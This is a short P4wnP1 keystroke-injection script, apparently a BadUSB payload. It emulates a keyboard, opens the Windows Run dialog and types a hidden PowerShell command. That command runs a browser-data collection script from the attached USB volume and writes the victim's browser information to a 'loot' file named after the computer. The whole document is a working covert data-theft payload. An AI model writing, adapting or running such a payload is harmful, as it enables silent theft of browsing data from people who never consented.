//BrowserData History
layout('us');
typingSpeed(0,0)
press("GUI r");
delay(500);
type("powershell -w h \".((gwmi win32_volume -f 'label=''P4WNP1''').Name+'browserData\\GetData.ps1')\"; $b =(gwmi win32_volume -f 'label=''P4WNP1''' |  Select-Object -ExpandProperty DriveLetter); Get-BrowserInformation | Out-File -Append $b\\loot\\$env:computername.txt\"\n")
delay(1000);
